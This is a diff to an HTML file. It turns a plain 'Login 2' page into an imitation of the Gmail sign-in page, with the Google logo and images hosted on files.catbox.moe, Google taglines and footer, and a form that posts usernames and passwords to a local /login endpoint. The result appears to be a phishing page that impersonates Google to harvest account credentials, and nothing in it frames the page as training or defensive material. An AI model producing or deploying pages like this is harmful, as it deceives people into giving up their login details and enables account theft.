@@ -1,22 +1,184 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Login 2</title>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>Gmail</title>
   <style>
-    body { background:linear-gradient(45deg, #ff0066, #6600ff); color:white; text-align:center; font-family:Verdana; padding-top:100px; }
-    .box { background:rgba(0,0,0,0.6); padding:40px; border-radius:15px; display:inline-block; box-shadow:0px 0px 15px #000; }
-    input,button { margin:10px; padding:12px; border-radius:5px; border:none; width:220px; }
-    button { background:#ffcc00; color:black; font-weight:bold; cursor:pointer; }
+    body {
+      background: #f1f1f1;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .wrapper {
+      max-width: 450px;
+      margin: 50px auto;
+      background: #fff;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+    .google-header-bar {
+      background: #f5f5f5;
+      padding: 15px;
+      text-align: center;
+      border-bottom: 1px solid #ddd;
+    }
+    .google-header-bar img.logo {
+      height: 40px;
+    }
+    .banner {
+      padding: 20px;
+      text-align: center;
+    }
+    .banner h1 {
+      margin: 0;
+      font-size: 22px;
+      color: #333;
+    }
+    .banner h2 {
+      margin: 5px 0 0;
+      font-size: 14px;
+      color: #777;
+    }
+    .signin-card {
+      padding: 20px;
+      text-align: center;
+    }
+    .signin-card .profile-img {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      margin: 10px auto;
+    }
+    .signin-card form {
+      margin-top: 20px;
+      text-align: left;
+    }
+    .signin-card label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #555;
+    }
+    .signin-card input[type="text"],
+    .signin-card input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 2px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+    }
+    .signin-card .g-button {
+      width: 100%;
+      padding: 10px;
+      background: #4285f4;
+      color: #fff;
+      font-size: 14px;
+      border: none;
+      border-radius: 2px;
+      cursor: pointer;
+    }
+    .signin-card .g-button:hover {
+      background: #357ae8;
+    }
+    .signin-card .remember {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin-top: 10px;
+      color: #555;
+    }
+    .signin-card .remember input {
+      margin-right: 5px;
+    }
+    .one-google {
+      text-align: center;
+      padding: 20px;
+      font-size: 13px;
+      color: #555;
+    }
+    .one-google .create-account {
+      margin-bottom: 10px;
+    }
+    .google-footer-bar {
+      background: #f5f5f5;
+      padding: 15px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      border-top: 1px solid #ddd;
+    }
+    .google-footer-bar ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+    .google-footer-bar a {
+      color: #777;
+      text-decoration: none;
+    }
+    .google-footer-bar a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Secure Login - Style 2</h2>
-    <form action="/login" method="post">
-      <input type="text" name="username" placeholder="Enter username"><br>
-      <input type="password" name="password" placeholder="Enter password"><br>
-      <button type="submit">Access</button>
-    </form>
+  <div class="wrapper">
+    <div class="google-header-bar centered">
+      <div class="header content clearfix">
+        <img alt="Google" class="logo" src="https://files.catbox.moe/8mwpoe.png">
+      </div>
+    </div>
+    <div class="main content clearfix">
+      <div class="banner">
+        <h1>Login To Continue</h1>
+        <h2 class="hidden-small">Login</h2>
+      </div>
+      <div class="card signin-card clearfix">
+        <img class="profile-img" src="https://files.catbox.moe/bonc7b.png" alt="">
+        <p class="profile-name"></p>
+
+        <!-- Form fixed to submit to /login -->
+        <form id="gaia_loginform" action="/login" method="post">
+          <div class="email-div">
+            <label for="Email"><strong class="email-label">Username</strong></label>
+            <input spellcheck="false" name="username" id="Email" type="text" required>
+          </div>
+          <div class="passwd-div">
+            <label for="Passwd"><strong class="passwd-label">Password</strong></label>
+            <input name="password" id="Passwd" type="password" required>
+          </div>
+          <input class="g-button g-button-submit" name="signIn" id="signIn" value="Sign in" type="submit">
+          <label class="remember">
+            <input name="PersistentCookie" id="PersistentCookie" value="yes" checked="checked" type="checkbox">
+            <strong class="remember-label">Stay signed in</strong>
+          </label>
+        </form>
+      </div>
+      <div class="one-google">
+        <p class="create-account">
+          <a id="link-signup" href="#">Create an account</a>
+        </p>
+        <p class="tagline">One Google Account for everything Google</p>
+        <img src="./Gmail_files/logo_strip_2x.png" width="210" height="17" alt="">
+      </div>
+    </div>
+    <div class="google-footer-bar">
+      <div class="footer content clearfix">
+        <ul id="footer-list">
+          <li>Google</li>
+          <li><a href="#">Privacy &amp; Terms</a></li>
+          <li><a href="#">Help</a></li>
+        </ul>
+      </div>
+    </div>
   </div>
 </body>
-</html>
+  </html>
